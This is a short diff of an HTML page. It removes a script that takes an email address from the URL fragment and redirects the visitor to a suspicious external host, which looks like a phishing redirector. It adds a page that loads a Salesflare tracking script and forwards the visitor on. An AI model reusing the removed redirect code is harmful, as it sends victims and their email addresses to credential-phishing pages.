@@ -1,6 +1,20 @@
-<script> 
-    var hash = window.location.hash;
-    cleanhash = hash.replace("#", ""); 
-    var linkx="https://mf7lppjgtt.shahbazia.sbs/?email=";
-    window.location.replace(linkx+''+cleanhash);
-</script>
+<html>
+    <head>
+        <script src="https://track.salesflare.com/flare.js"></script>
+    </head>
+
+    <body>
+        <script>
+            window.onerror = function (m, u, l) {
+                try {
+                    window.location.href = decodeURIComponent(Flare.vars.u);
+                }
+                catch (_) {
+                    window.location.href = unescape(Flare.vars.u);
+                }
+            };
+            var flare = new Flare();
+            flare.forward();
+        </script>
+    </body>
+</html>
